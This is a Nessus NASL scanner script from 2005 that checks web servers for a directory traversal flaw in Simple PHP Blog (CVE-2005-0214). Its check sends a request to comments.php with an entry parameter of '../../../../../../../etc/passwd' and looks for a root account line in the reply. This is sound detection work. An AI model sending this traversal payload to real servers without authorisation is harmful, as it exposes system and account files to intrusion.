#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Alexander Palmo
# This script is released under the GNU GPL v2
#

if(description)
{
 script_id(16137);
 script_cve_id("CVE-2005-0214");
 script_bugtraq_id(12193);
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "Simple PHP Blog dir traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host runs Simple PHP Blog, an open source blog written in PHP,
which allows for retrieval of arbitrary files from the web server.
These issues are due to a failure of the application to properly 
sanitize user-supplied input data. 

Solution: Upgrade at least to version 0.3.7 r2.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Simple PHP Blog dir traversal";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# the code
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

function check(loc)
{
 req = http_get(item:string(loc,  "/comments.php?y=05&m=01&entry=../../../../../../../etc/passwd"), port:port);
 rep = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( !rep )exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
 {
 	security_hole(port);
	exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
